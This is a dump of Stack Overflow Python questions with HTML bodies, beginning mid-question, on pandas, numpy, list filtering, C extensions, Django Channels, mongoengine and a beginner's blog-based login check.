b = [""Green"", ""Fletcher"", ""Nelson""]

vowel = [""a"", ""e"", ""i"", ""o"", ""u""]

gen = ((x, y) for x in a for y in b)

score = 0

for first, second in gen:
    print first, second
    name = first, second
    score = len(first) + len(second) +1
    for letter in name:
        if letter in vowel:
            score+1
    print score
</code></pre>

<p><strong>This is what i currently have and this is the output I get:</strong></p>

<pre><code>John Green
10
John Fletcher
13
John Nelson
11
Kate Green
10
Kate Fletcher
13
Kate Nelson
11
Oli Green
9
Oli Fletcher
12
Oli Nelson
10
</code></pre>

<p><strong>This is the output I need:</strong></p>

<pre><code>Full Name: John Green Score: 13 
Full Name: John Fletcher Score: 16 
Full Name: John Nelson Score: 14 
Full Name: Kate Green Score: 14 
Full Name: Kate Fletcher Score: 17 
Full Name: Kate Nelson Score: 15 
Full Name: Oli Green Score: 13 
Full Name: Oli Fletcher Score: 16
Full Name: Oli Nelson Score: 14
</code></pre>
"
39757901,4695774.0,2016-09-28 21:23:07+00:00,3,how to initialize multiple columns to existing pandas DataFrame,"<p>how can I initialize multiple columns in a single instance in an existing pandas DataFrame object? I can initialize single column at an instance, this way:</p>

<pre><code>df = pd.DataFrame({'a':[1,2,3],'b':[4,5,6]}, dtype='int')
df['c'] = 0
</code></pre>

<p>but i cannot do something like:</p>

<pre><code>df[['c','d']] = 0 or
df[['c']['d']] = 0
</code></pre>

<p>is there a way i can achieve this?</p>
"
39769958,4988601.0,2016-09-29 12:10:23+00:00,3,"Python, create new list based on condition applied to an existing list of same length","<p>Ok, I'm sure there is a very easy way to do this, but I'm rusty in python and I can't work out the pythonic way to do this.</p>

<p>I have a list, representing the hours of the day:</p>

<pre><code>import numpy as np
hourOfDay = np.mod(range(0, 100), 24)
</code></pre>

<p>Then I want to create a new list which is a larger value <code>0.4</code>, when the hour is between <code>7</code> and <code>22</code>, and <code>0.2</code> otherwise.</p>

<p>There are several related posts <a href=""http://stackoverflow.com/questions/15147696/python-how-to-create-a-new-list-based-on-existing-list-without-certain-objects"">here</a> and <a href=""http://stackoverflow.com/questions/7406448/python-create-a-new-list-from-a-list-when-a-certain-condition-is-met"">here</a>, but they're not quite what I want (they end up with a shorter list, I want the same-length list).</p>

<p>Assuming I needed to use list comprehension I tried this:</p>

<pre><code>newList = [0.4 for hour in hourOfDay if hour &lt;= 7 or hour &gt;= 22 else 0.2]
</code></pre>
"
39970857,4786305.0,2016-10-11 05:11:15+00:00,3,Filtering a list. Get elements of list only with a certain distance between items?,"<p>I need to get only those elements that are to some extent distant from each other. For example, I have a list of integers:</p>

<pre><code>data = [-2000, 1000, 2000, 3500, 3800, 4500, 4600, 5000, 6000]
</code></pre>

<p>Let's assume I want to retrieve only those elements that have have a distance of at least <strong>1000</strong> between each other.
From the list above I need output:</p>

<pre><code>[-2000, 1000, 2000, 3500, 4500, 6000]
</code></pre>

<hr>

<p>For the moment I'm filtering this way:</p>

<pre><code>filtered.append(data[0])
for index, obj in enumerate(data):
    if index &lt; (l - 1): 
        if abs(obj - data[index+1]) &gt; 999:
            filtered.append(data[index+1])

print(filtered)
</code></pre>

<p>Undesired output:</p>

<pre><code>[-2000, 1000, 2000, 3500, 6000]
</code></pre>

<hr>

<p>It fails because it compares two adjacent list elements, irregardless of the fact that some elements supposed to be filtered out and should not be taken into account when comparing. </p>

<p>Let me show more clearly.<br>
Original list: <code>[-2000, 1000, 2000, 3500, 3800, 4500, 4600, 5000, 6000]</code></p>

<p>Filtering process: </p>

<pre><code>-2000 - OK
1000 - OK
2000 - OK
3500 - OK
3800 - Out
4500 - Should be OK, but it filtered out compared to 3800. But it should be compared to 3500 (not 3800 which is Out). 
</code></pre>

<hr>

<p>How to fix it?</p>
"
39970703,489561.0,2016-10-11 04:53:29+00:00,3,Identifying closest value in a column for each filter using Pandas,"<p>I have a data frame with categories and values.  I need to find the value in each category closest to a value.  I think I'm close but I can't really get the right output when applying the results of argsort to the original dataframe.</p>

<p>For example, if the input was defined in the code below the output should have only <code>(a, 1, True)</code>, <code>(b, 2, True)</code>, <code>(c, 2, True)</code> and all other isClosest <code>Values</code> should be False.</p>

<p>If multiple values are closest then it should be the first value listed marked.</p>

<p>Here is the code I have which works but I can't get it to reapply to the dataframe correctly.  I would love some pointers.</p>

<pre><code>df = pd.DataFrame()
df['category'] = ['a', 'b', 'b', 'b', 'c', 'a', 'b', 'c', 'c', 'a']
df['values'] = [1, 2, 3, 4, 5, 4, 3, 2, 1, 0]
df['isClosest'] = False

uniqueCategories = df['category'].unique()
for c in uniqueCategories:
    filteredCategories = df[df['category']==c]    
    sortargs = (filteredCategories['value']-2.0).abs().argsort()
    #how to use sortargs so that we set column in df isClosest=True if its the closest value in each category to 2.0?
</code></pre>
"
39822276,1459581.0,2016-10-02 22:14:53+00:00,3,numpy multidimensional (3d) matrix multiplication,"<p>I get two 3d matrix A (32x3x3) and B(32x3x3), and I want to get matrix C with dimension 32x3x3. The calculation can be done using loop like:</p>

<pre><code>a = numpy.random.rand(32, 3, 3)
b = numpy.random.rand(32, 3, 3)
c = numpy.random.rand(32, 3, 3)

for i in range(32):
    c[i] = numpy.dot(a[i], b[i])
</code></pre>

<p>I believe there must be a more efficient one-line solution to this problem. Can anybody help, thanks.</p>
"
40061185,6811609.0,2016-10-15 15:57:26+00:00,3,Easiest way to return sum of a matrix's neighbors in numpy,"<p>I am trying to make a program that needs a matrix's neighbor(excluding itself) sum ex:</p>

<pre><code> matrix([[0, 0, 0],
        [1, 0, 1],
        [0, 1, 0]])  
</code></pre>

<p>would return:</p>

<pre><code>matrix([[1, 2, 1],
        [1, 3, 1],
        [2, 2, 2]])
</code></pre>

<p>I have a working code here but its big and messy and I'm new to numpy so I need some help cleaning it up and optimizing. (I feel like there has to be a better way)</p>

<p>example code:</p>

<pre><code>import numpy as np

def NiSum(m):
    new = []
    for x in range(m.shape[0]-1):
        row = []
        for y in range(m.shape[1]-1):
            Ni = 0
            for a in [1,1],[1,0],[1,-1],[0,1],[0,-1],[-1,1],[-1,0],[-1,-1]:
                Ni += m[x+a[0],y+a[1]]
            row.append(Ni)
        new.append(row)
    return np.matrix(new)


example = np.matrix('0 0 0 0 0 0 0 0; '*3+'0 0 0 1 1 1 0 0; '*3+'0 0 0 0 0 0 0 0;0 0 0 0 0 0 0 0 ')

NiSum(example)
</code></pre>

<p>Thanks for any help !</p>
"
39822944,6846829.0,2016-10-02 23:56:15+00:00,3,Adding horizontal space between data on a Read only script,"<p>I need my output to look nice, and it looks very sloppy. </p>

<p>--------Current output---------</p>

<pre><code>Below are the players and their scores

John Doe 120
Sally Smooth 115
</code></pre>

<p>----------End current output----------</p>

<p>My desired output follows</p>

<p>-------Desired output-----------------</p>

<pre><code>Below are the players and their scores

John Doe         120
Sally Smooth     115
</code></pre>

<p>--------End desired output-------------</p>

<p>my current code follows;</p>

<pre><code>def main():

     # opens the ""golf.txt"" file created in the Golf Player Input python
     # in read-only mode
     infile = open('golf.txt', 'r')

     print(""Below are the players and their scores"")
     print()

     # reads the player array from the file
     name = infile.readline()

     while name != '':

          # reads the score array from the file
          score = infile.readline()

          # strip newline from field
          name = name.rstrip('\n')
          score = score.rstrip('\n')
          # prints the names and scores
          print(name + "" "" + score)

          # read the name field of next record
          name = infile.readline()

     # closes the file    
     infile.close()


 main()
</code></pre>
"
40117685,6461192.0,2016-10-18 20:40:46+00:00,3,String Containment in Pandas,"<p>I am trying to produce all the rows where company1 in df is contained in company2. I am doing it as follows:</p>

<pre><code>df1=df[['company1','company2']][(df.apply(lambda x: x['company1'] in x['company2'], axis=1) == True)]
</code></pre>

<p>When I run the above line of code, it also shows ""South"" matched with ""Southern"". Also, ""South"" matched with ""Route South"". I want to get rid of all such cases. Company1 should only be contained in beginning of Company2. And, company1 should not be a part of some word in company2 like ""South"" (company1) matched with ""Southern"" (company2). How should I modify my code to accomplish above two requirements?</p>
"
39969798,6941046.0,2016-10-11 02:50:40+00:00,3,More memory efficient way of making a dictionary?,"<p>VERY sorry for the vagueness, but I don't actually know what part of what I'm doing is inefficient. </p>

<p>I've made a program that takes a list of positive integers (example*):</p>

<pre><code>[1, 1, 3, 5, 16, 2, 4, 6, 6, 8, 9, 24, 200,]
</code></pre>

<p>*the real lists can be up to 2000 in length and the elements between 0 and 100,000 exclusive</p>

<p>And creates a dictionary where each number tupled with its index (like so: <code>(number, index)</code>) is a key and the value for each key is a list of every number (and that number's index) in the input that it goes evenly into.</p>

<p>So the entry for the 3 would be: <code>(3, 2): [(16, 4), (6, 7), (6, 8), (9, 10), (24, 11)]</code></p>

<p>My code is this:</p>

<pre><code>num_dict = {}
sorted_list = sorted(beginning_list)

for a2, a in enumerate(sorted_list):
    num_dict[(a, a2)] = []

for x2, x in enumerate(sorted_list):
    for y2, y in enumerate(sorted_list[x2 + 1:]):
        if y % x == 0:
            pair = (y, y2 + x2 + 1)
            num_dict[(x, x2)].append(pair)
</code></pre>

<p>But, when I run this script, I hit a <code>MemoryError</code>.</p>

<p>I understand that this means that I am running out of memory but in the situation I'm in, adding more ram or updating to a 64-bit version of python is not an option.</p>

<p>I am certain that the problem is not coming from the list sorting or the first for loop. It has to be the second for loop. I just included the other lines for context.</p>

<p>The full output for the list above would be (sorry for the unsortedness, that's just how dictionaries do):</p>

<pre><code>(200, 12): []
(6, 7): [(24, 11)]
(16, 10): []
(6, 6): [(6, 7), (24, 11)]
(5, 5): [(200, 12)]
(4, 4): [(8, 8), (16, 10), (24, 11), (200, 12)]
(9, 9): []
(8, 8): [(16, 10), (24, 11), (200, 12)]
(2, 2): [(4, 4), (6, 6), (6, 7), (8, 8), (16, 10), (24, 11), (200, 12)]
(24, 11): []
(1, 0): [(1, 1), (2, 2), (3, 3), (4, 4), (5, 5), (6, 6), (6, 7), (8, 8), (9, 9), (16, 10), (24, 11), (200, 12)]
(1, 1): [(2, 2), (3, 3), (4, 4), (5, 5), (6, 6), (6, 7), (8, 8), (9, 9), (16, 10), (24, 11), (200, 12)]
(3, 3): [(6, 6), (6, 7), (9, 9), (24, 11)]
</code></pre>

<p>Is there a better way of going about this?</p>

<h3>EDIT:</h3>

<p>This dictionary will then be fed into this:</p>

<pre><code>ans_set = set()
for x in num_dict:
    for y in num_dict[x]:
        for z in num_dict[y]:
            ans_set.add((x[0], y[0], z[0]))
return len(ans_set)
</code></pre>

<p>to find all unique possible triplets in which the 3rd value can be evenly divided by the 2nd value which can be evenly divided by the 1st.</p>

<p>If you think you know of a better way of doing the entire thing, I'm open to redoing the whole of it.</p>

<h1>Final Edit</h1>

<p>I've found the best way to find the number of triples by reevaluating what I needed it to do. This method doesn't actually find the triples, it just counts them.</p>

<pre><code>def foo(l):
    llen = len(l)
    total = 0
    cache = {}
    for i in range(llen):
        cache[i] = 0
    for x in range(llen):
        for y in range(x + 1, llen):
            if l[y] % l[x] == 0:
                cache[y] += 1
                total += cache[x]
    return total
</code></pre>

<p>And here's a version of the function that explains the thought process as it goes (not good for huge lists though because of spam prints):</p>

<pre><code>def bar(l):
    list_length = len(l)
    total_triples = 0
    cache = {}
    for i in range(list_length):
        cache[i] = 0
    for x in range(list_length):
        print(""\n\nfor index[{}]: {}"".format(x, l[x]))
        for y in range(x + 1, list_length):
            print(""\n\ttry index[{}]: {}"".format(y, l[y]))
            if l[y] % l[x] == 0:
                print(""\n\t\t{} can be evenly diveded by {}"".format(l[y], l[x]))
                cache[y] += 1
                total_triples += cache[x]
                print(""\t\tcache[{0}] is now {1}"".format(y, cache[y]))
                print(""\t\tcount is now {}"".format(total_triples))
                print(""\t\t(+{} from cache[{}])"".format(cache[x], x))
            else:
                print(""\n\t\tfalse"")
    print(""\ntotal number of triples:"", total_triples)
</code></pre>
"
39748916,1601443.0,2016-09-28 13:26:26+00:00,3,Find maximum value and index in a python list?,"<p>I have a python list that is like this,</p>

<pre><code>[[12587961, 0.7777777777777778], [12587970, 0.5172413793103449], [12587979, 0.3968253968253968], [12587982, 0.88], [12587984, 0.8484848484848485], [12587992, 0.7777777777777778], [12587995, 0.8070175438596491], [12588015, 0.4358974358974359], [12588023, 0.8985507246376812], [12588037, 0.5555555555555555], [12588042, 0.9473684210526315]]
</code></pre>

<p>This list can be up to thousand elements in length, how can I get the maximum value in the list according to the second item in the sub-array, and get the index of the maximum value which is the fist element in the sub-array in python?</p>
"
39969463,3431336.0,2016-10-11 02:07:39+00:00,3,checking if a random value exists from previous loop,"<p>I'm trying to generate a random value for each loop and save it to variable <code>minimum</code> WHILE doing a check if that number has already been generated  before in one of the previous loops. </p>

<p><code>listQ</code> basically contains <strong>6 lines</strong> that were randomly chosen from a file. The lines were chosen from  between <code>1</code> to <code>max_line</code> (which is basically 6 steps less than <code>max_line</code> value). So it's important that I have to generate a number that's a multiplier of 6.</p>

<pre><code>for x in range(0, 10):
    minimum = random.randrange(0, max_line,6)
    maximum = minimum+6
    listQ = listQ[minimum:maximum]
</code></pre>

<p>A bit stuck here. A list maybe?</p>
"
39623764,5393381.0,2016-09-21 18:15:11+00:00,3,Self-built extension module slower than built-in c module,"<p>To learn how to create C-extensions I've decided to just copy a built-in <code>.c</code>-file (in this case <a href=""https://github.com/python/cpython/blob/master/Modules/itertoolsmodule.c"" rel=""nofollow""><code>itertoolsmodule.c</code></a>) and placed it in my package. I only changed the names inside the module from <code>itertools</code> to <code>mypkg</code>.</p>

<p>Then I compiled it (Windows 10, MSVC Community 14) as Extension:</p>

<pre><code>from setuptools import setup, Extension

itertools_module = Extension('mypkg.itertoolscopy',
                              sources=['src/itertoolsmodulecopy.c'])

setup(...
      ext_modules=[itertools_module])
</code></pre>

<p>The default uses the compiler flags <code>/c /nologo /Ox /W3 /GL /DNDEBUG /MD</code> and I read somewhere that these defaults equals the settings of how the python was compiled (I use Anaconda so this might <em>not</em> necessarily be true).</p>

<p>It all went well - but a benchmark for <code>filterfalse</code> showed that it's almost a factor 2 slower than the built-in:</p>

<pre><code>import mypkg
import itertools

import random

a = [random.random() for _ in range(500000)]
func = None

%timeit list(filter(func, a))
100 loops, best of 3: 3.42 ms per loop
%timeit list(itertools.filterfalse(func, a))
100 loops, best of 3: 3.41 ms per loop
%timeit list(mypkg.filterfalse(func, a))
100 loops, best of 3: 6.77 ms per loop
</code></pre>

<p>However, for smaller iterables the discrepancy also becomes smaller:</p>

<pre><code>a = [random.random() for _ in range(500)]  # 1 / 1000 of the elements

%timeit list(filter(func, a))
100000 loops, best of 3: 9.66 Âµs per loop
%timeit list(itertools.filterfalse(func, a))
100000 loops, best of 3: 10.8 Âµs per loop
%timeit list(mypkg.filterfalse(func, a))
100000 loops, best of 3: 14.4 Âµs per loop
</code></pre>

<p>I wasn't able to explain this difference in speed but I have to admint that I'm not too familiar with compiling <code>C</code>-code. I'm at a loss what actually makes it slower or if it's just that it's a seperate package instead of a builtin (maybe lookups are slower?). </p>

<p>The results are the same on python 2.7 with <code>ifilter</code> and <code>ifilterfalse</code> and the 2.7 version of the <code>itertoolsmodule.c</code> file.</p>

<p>Does anyone knows what makes the code perform worse than the built-ins and how one could speed it up?</p>
"
39696606,4885590.0,2016-09-26 07:04:18+00:00,3,"""PermissionError"" thrown when typing ""exit()"" to leave the Python interpreter","<p>When I enter the python interpreter as a regular user with <code>python</code>. I see this:</p>

<pre><code>Python 3.5.2 |Anaconda 4.1.1 (64-bit)| (default, Jul  2 2016, 17:53:06) 
[GCC 4.4.7 20120313 (Red Hat 4.4.7-1)] on linux
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.
</code></pre>

<p>I can immediately type <code>exit()</code> and this happens:</p>

<pre><code>&gt;&gt;&gt; exit()
Error in atexit._run_exitfuncs:
PermissionError: [Errno 13] Permission denied
</code></pre>

<p>I think it may be related to the fact that running <code>sudo python3</code> gives: </p>

<pre><code>Python 3.5.2 (default, Jul  5 2016, 12:43:10) 
[GCC 5.4.0 20160609] on linux
Type ""help"", ""copyright"", ""credits"" or ""license"" for more information. 
&gt;&gt;&gt; 
</code></pre>

<p>This looks to be a different python 3.5 install.</p>

<p>If this is the issue I would like to have my anaconda python install run when I type <code>sudo python3</code>. How do I do this?</p>
"
39773922,5774291.0,2016-09-29 15:07:34+00:00,3,Unexpected behaviour with numpy advanced slicing in named arrays,"<p>When using numpy named arrays I observe a different behaviour in the following two cases:</p>

<ol>
<li>case: first using an index array for advanced slicing and then selecting a subarray by name</li>
<li>case: first selecting a subarray by name and then using an index array for advanced slicing</li>
</ol>

<p>The follwing code presents an example</p>

<pre><code>import numpy as np

a = np.ones(5)
data = np.array(zip(a, a, a), dtype=[(""x"", float), (""y"", float), (""z"", float)])

# case 1
# does not set elements 1, 3 and 4 of data to 22
data[[1, 3, 4]][""y""] = 22    
print data[""y""]  # -&gt; [ 1.  1.  1.  1.  1.]

# case 2
# set elements 1, 3 and 4 of data to 22
data[""y""][[1, 3, 4]] = 22
print data[""y""]  # -&gt; [  1.  22.   1.  22.  22.]
</code></pre>

<p>The output of the two print commands is 
[ 1.  1.  1.  1.  1.] and [  1.  22.   1.  22.  22.]. Why does changing the order of the selections lead to different results when setting the elements?</p>
"
39622081,3107858.0,2016-09-21 16:39:06+00:00,3,Pandas Dataframe automatic typecasting,"<p>I am working with a pandas dataframe and need several columns (x &amp; y in the example below) to be an integer and one column to be a float (l).  It appears that assigning a new row with a float in it recasts the whole dataframe as a float.  Why is this and how do I prevent it?</p>

<pre><code>data = pd.DataFrame(data=[[3103, 1189, 1]],index = None, columns = ['y', 'x', 'l'], dtype = int)
print data.y
data.ix[1] = (3, 3, 3.4)
print data.y
</code></pre>

<p>Which produces: </p>

<pre><code>0    3103
Name: y, dtype: int32
0    3103
1       3
Name: y, dtype: float64
</code></pre>
"
39602802,6131788.0,2016-09-20 19:59:07+00:00,3,Combining data divided between multiple columns after pivoting pandas data table,"<p>I have a Pandas data frame that is shaped as follows:</p>

<pre><code>TIME   2015-07-25_10:24:49    2015-07-25_10:24:51   2015-07-25_10:24:46 ...
NAME        
Ed          Kitchen                 None                 Office
Jane         None                Dining Room              None
Robert       None                  Kitchen                None
Louisa       None                   None                 Office
   .
   .
   .
</code></pre>

<p>This dataframe can be reproduced with this snippet:</p>

<pre><code>import datetime
import pandas as pd

names = ['Ed', 'Jane', 'Robert', 'Louisa', 'Ed']
locations = ['Kitchen', 'Dining Room', 'Kitchen', 'Office', 'Office']
times = [datetime.datetime(2015, 7, 25, 10, 24, 49), 
         datetime.datetime(2015, 7, 25, 10, 24, 51),
         datetime.datetime(2015, 7, 25, 10, 24, 51),
         datetime.datetime(2015, 7, 25, 10, 24, 46),
         datetime.datetime(2015, 7, 25, 10, 24, 46)]

data = {'TIME': times, 
        'NAME': names,
        'LOCATIONS': locations}

df = pd.DataFrame(data=data)

df = df.pivot(index='NAME', columns='TIME', values='LOCATIONS')
</code></pre>

<p>From this data frame, I want to produce a data frame with the columns collapsed into time ranges:</p>

<pre><code>TIME   2015-07-25, 10:23-10:25   2015-07-25, 10:25-10:27   ...
NAME        
Ed            Kitchen                     Office
Jane        Dining Room                    None
Robert        Kitchen                      None
Louisa        Office                       None 
   .
   .
   .
</code></pre>

<p>The idea being to 'collapse' the given data down into as few column bins as possible to eliminate as many NaNs as possible.  The conversion in the columns is from time stamps to a range of time stamps. So, rather that 'Ed has been in the kitchen for two minutes,' it's 'At some point in the two minute range between 10:23 and 10:25, Ed was in the kitchen.' The last entry would ideally be pushed into the next time stamp range, even though it actually occurred in the first one.</p>

<p>Feel free to let me know if I can clarify in any way. Thanks in advance -</p>
"
39632347,4066515.0,2016-09-22 07:02:21+00:00,3,Bootstrap Tabs not showing content when I use tal:repeat to display <li> elements in Pyramid Framework,"<p>I want to create dynamic tabs and their content in Pyramid using Bootstrap and Chameleon template engine for Python, but only the first tab remains activate despite of clicking on other tabs.<br>
My HTML Code:</p>

<pre><code>&lt;ul class=""nav nav-tabs responsive""&gt;
    &lt;li&gt;&lt;a data-toggle=""tab"" href=""#tips""&gt;Tips&lt;/a&gt;&lt;/li&gt;
    &lt;li tal:repeat=""key dict""&gt;&lt;a data-toggle=""tab""href=""#${key}""&gt;${key}  &lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=""tab-content responsive""&gt;
    &lt;div tal:repeat=""(keys,value) dict.iteritems()"" id=""${keys}"" class=""tab-pane fade""&gt;
    &lt;p&gt;${value}&lt;/p&gt;
    &lt;/div&gt;
    &lt;div id=""tips"" class=""tab-pane fade in active""&gt;
        &lt;p&gt;tips&lt;/p&gt;
    &lt;/div&gt;
&lt;/div&gt;
</code></pre>
"
39977069,5034645.0,2016-10-11 12:17:31+00:00,3,Unable to reliabily Match Base 64 encrypted String from strings stored in a Website: Python Program,"<p>I am Rishabh and am a beginner in Python Programming Language.. I have attempted to write a sort of an Authentication Program using Python. </p>

<p><strong>Here's What I am doing in my Program:</strong></p>

<ol>
<li>I get the Username and Password</li>
<li>I concatenate the two strings like : ###Username:::Password</li>
<li>Then I encrypt the above concatenated string using a base64 encoding program that I saw online.(I am unfamiliar with base64 encoding and I a beginner in all the tools I have used in the below Python Program)</li>
<li>Now you get an encrypted String.</li>
<li>I have the same encrypted string hidden within the html of the blog that I created for this purpose : <strong><a href=""https://pastarchive.blogspot.in"" rel=""nofollow"">https://pastarchive.blogspot.in</a></strong></li>
</ol>

<p><strong>The Encrypted Strings are stored as hidden text in the html code of the page:</strong></p>

<pre><code>&lt;span style=""background-color: white; display: none;""&gt;HELLO !! POST&lt;/span&gt;&lt;br /&gt;
&lt;span style=""background-color: white; display: none;""&gt;HELLO !! POST&lt;/span&gt;&lt;br /&gt;
&lt;span style=""background-color: white; display: none;""&gt;HELLO !! POST&lt;/span&gt;&lt;br /&gt;
&lt;span style=""background-color: white; display: none;""&gt;HELLO !! POST&lt;/span&gt;&lt;br /&gt;
&lt;span style=""background-color: white; display: none;""&gt;HELLO !! POST&lt;/span&gt;&lt;br /&gt;
&lt;span style=""background-color: white; display: none;""&gt;IIKTxK6FBJC+or4JPyQqSI0BrAevMJix//LSgGyoiETg=&lt;/span&gt;&lt;br /&gt;
&lt;span style=""background-color: white; display: none;""&gt;4M3CXPZGRKUsQRqbaOPd/gajp6XD9irrM2pQ8N9MHyM=&lt;/span&gt;&lt;br /&gt;
&lt;span style=""background-color: white; display: none;""&gt;F5uxniPOSEiU2h/v1QreAx1+hXzW7GRRcJS15kYE/EM=&lt;/span&gt;&lt;br /&gt; 
&lt;span style=""background-color: white; display: none;""&gt;mAHuxBo7URh0QcRswXTccxq/sMTUNfbqmSaiopZxzuA=&lt;/span&gt;&lt;br /&gt;
</code></pre>

<p><strong>The random characters you see in the above html code is from the website:</strong> </p>

<ol start=""6"">
<li>So What I do is.. I make an encrypted string in the program as said before and I just check if the exact string exists in the website. If it is, I just display the ""Successfully Logged in message"" and if not I just display ""Login Failed.""</li>
</ol>

<p><strong>The Problem:</strong></p>

<p>The problem I have is that, This method strangely works only for a few users and the rest don't succeed in finding the exact string from the website source code even though the exact encrypted string is present in the website. </p>

<p>Please Download the Code and run it so that you can Understand</p>

<p><strong>1. The Account which Sucessfully Logs in:</strong></p>

<p><strong>Username is</strong> : USER</p>

<p><strong>Password is</strong> : TEMPPASS</p>

<p>This account works perfectly as I thought</p>

<p><strong>2. The Accounts which strangely doesn't work:</strong> </p>

<p><strong>Username is</strong> : user2</p>

<p><strong>Password is</strong> : CLR</p>

<p>Can someone tell me why the first account works perfectly fine and the later fails ? And how do I Fix this issue ? Please guide me to fix this issue as I am a beginner.</p>

<p>Don't get confused by the Administrator Account.. Its just a Locally verified Account..</p>

<p><strong>The Code:</strong></p>

<pre><code>import requests
from getpass import getpass
from bs4 import BeautifulSoup
import re
import csv
import time
from Crypto.Cipher import AES
import base64

counter =1
counter2=1
import requests
import urllib2
from bs4 import BeautifulSoup
import re

print(""\nPlease Authenticate Yourself:"")
#print(""Welcome to Mantis\n"")
user = raw_input(""\nEnter Username:"")
password= getpass(""\nEnter Password:"")
print ""\n....................................................................""

matchstring=""###""+user+"":::""+password
matches=""""
chkstr=matchstring
print chkstr
        ###Encryption
msg_text = chkstr.rjust(32)
secret_key = '1234567890123456'
cipher = AES.new(secret_key,AES.MODE_ECB)
encoded = base64.b64encode(cipher.encrypt(msg_text))
#encoded = encoded.encode('string-escape')
print ""Encrypted Text: \n""+encoded




##print matchstring #data sent for Authentication
if encoded == ""OiKUr4N8ZT7V7hZlwvnXP2d0F1I4xtktNbZSpNotJh0="":
        print ""\nHello Rishabh !! Is the Login Portal Locked ?""
        print ""\n\nAdministrator Access Granted""
        counter2=2
if counter2==1:

        ###https://pastarchive.blogspot.in
        ###https://pastarchive.wordpress.com/2016/10/08/hello/
        html_content = urllib2.urlopen('https://pastarchive.blogspot.in').read()
        rematchstring=re.compile(encoded)
        matches = re.findall(encoded, html_content);


if len(matches) != 0 or counter2==2:
                print 'Sucessfully Logged in\n'
                print 'Hello '+user.upper()+"" !\n""
                if user.upper()!=""ADMINISTRATOR"":
                 print ""Thanks in Advance for using Eagle, the Advanced Data Parsing Algorithm.""
                 print ""\nCreator - Rishabh Raghunath, Electrical Engineering Student, MVIT\n""
                time.sleep(1)
                print ""Let's Start !\n""
                print "".....................................................................\n""
if len(matches) == 0:
       print '\nUserName or Password is Incorrect\n'
       print ""Please Check Your mail in case your Password has been Changed""
       print ""Log in failed.\n""
       time.sleep(5)                
</code></pre>

<p>Please Try to help me out with this Strange Problem.. I don't have a clue how to solve this..
Thanks.</p>
"
39603399,6855318.0,2016-09-20 20:43:13+00:00,3,"pandas daily average, pandas.resample","<p>I have a csv file similar to this</p>

<pre><code>Date,Temp1,Temp2

23-Oct-09 01:00:00,21.1,22.3

23-Oct-09 04:00:00,22.3,23.8

23-Oct-09 07:00:00,21.4,21.3

23-Oct-09 10:00:00,21.5,21.6

23-Oct-09 13:00:00,22.3,23.8

23-Oct-09 16:00:00,21.4,21.3

23-Oct-09 19:00:00,21.1,22.3

23-Oct-09 22:00:00,21.4,21.3

24-Oct-09 01:00:00,22.3,23.8

24-Oct-09 04:00:00,22.3,23.8

24-Oct-09 07:00:00,21.1,22.3

24-Oct-09 10:00:00,22.3,23.8

24-Oct-09 13:00:00,21.1,22.3

24-Oct-09 16:00:00,22.3,23.8

24-Oct-09 19:00:00,21.1,22.3

24-Oct-09 22:00:00,22.3,23.8
</code></pre>

<p>I have read the data with:</p>

<pre><code>df=pd.read_csv('data.csv', index_col=0)
</code></pre>

<p>and converted the index to date time</p>

<pre><code>df.index=pd.to_datetime(df.index)
</code></pre>

<p>Now I want to take the mean of each daily temperature, I have been trying to use pd.resample as below, but have been receiving errors. I've read the pandas.resample docs and numerous examples on here and am still at a loss...</p>

<pre><code>df_avg = df.resample('D', how = 'mean')
</code></pre>

<blockquote>
  <p>DataError: No numeric types to aggregate</p>
</blockquote>

<p>I would like df_avg to be a dataframe with a datetime index and the two 2 columns. I am using pandas 0.17.1 and python 3.5.2, any help greatly appreciated!</p>
"
40005701,1577434.0,2016-10-12 18:19:38+00:00,3,How to get current user from a Django Channels web socket packet?,"<p>I was following this tutorial: <a href=""https://blog.heroku.com/in_deep_with_django_channels_the_future_of_real_time_apps_in_django"" rel=""nofollow"">Finally, Real-Time Django Is Here: Get Started with Django Channels</a>.</p>

<p>I wanted to extend the app by using Django User objects instead of the <code>handle</code> variable. <strong>But how can I get the current user from the received WebSocket packet in my <code>ws_recieve(message)</code> function?</strong></p>

<p>I noticed that both the <code>csrftoken</code> and the first ten digits of <code>sessionid</code> from the web socket packet match a normal HTTP request. Can I get the current user with this information?</p>

<p>For reference the received packet looks like this:</p>

<pre><code>{'channel': &lt;channels.channel.Channel object at 0x110ea3a20&gt;,
 'channel_layer': &lt;channels.asgi.ChannelLayerWrapper object at 0x110c399e8&gt;,
 'channel_session': &lt;django.contrib.sessions.backends.db.SessionStore object at 0x110d52cc0&gt;,
 'content': {'client': ['127.0.0.1', 52472],
             'headers': [[b'connection', b'Upgrade'],
                         [b'origin', b'http://0.0.0.0:8000'],
                         [b'cookie',
                          b'csrftoken=EQLI0lx4SGCpyTWTJrT9UTe1mZV5cbNPpevmVu'
                          b'STjySlk9ZJvxzHj9XFsJPgWCWq; sessionid=kgi57butc3'
                          b'zckszpuqphn0egqh22wqaj'],
                         [b'cache-control', b'no-cache'],
                         [b'sec-websocket-version', b'13'],
                         [b'sec-websocket-extensions',
                          b'x-webkit-deflate-frame'],
                         [b'host', b'0.0.0.0:8000'],
                         [b'upgrade', b'websocket'],
                         [b'sec-websocket-key', b'y2Lmb+Ej+lMYN+BVrSXpXQ=='],
                         [b'user-agent',
                          b'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) '
                          b'AppleWebKit/602.1.50 (KHTML, like Gecko) Version'
                          b'/10.0 Safari/602.1.50'],
                         [b'pragma', b'no-cache']],
             'order': 0,
             'path': '/chat-message/',
             'query_string': '',
             'reply_channel': 'websocket.send!UZaOWhupBefN',
             'server': ['127.0.0.1', 8000]},
 'reply_channel': &lt;channels.channel.Channel object at 0x110ea3a90&gt;}
</code></pre>
"
39632486,6285124.0,2016-09-22 07:11:03+00:00,3,Mongoengine signals listens for all models,"<p>I have setup <code>django</code> project with <code>mongoengine</code> for using mongodb with django. I have created 2 models and they work fine, but when I use signal listener for one model It also listens for another model, so how can I keep the signals bound to their models?</p>

<p>Here's my code for model User:</p>

<pre class=""lang-py prettyprint-override""><code>from mongoengine import *
from mongoengine import signals
from datetime import datetime


class User(Document):
    uid = StringField(max_length=60, required=True)
    platform = StringField(max_length=20, required=True)
    index = StringField(max_length=80)
    last_updated = DateTimeField(required=True, default=datetime.now())

    meta = {
        'collection': 'social_users'
    }


def before_save(sender, document, **kwargs):
    if document.platform and document.uid:
        document.index = document.platform+'/'+document.uid

signals.pre_save.connect(before_save)
</code></pre>

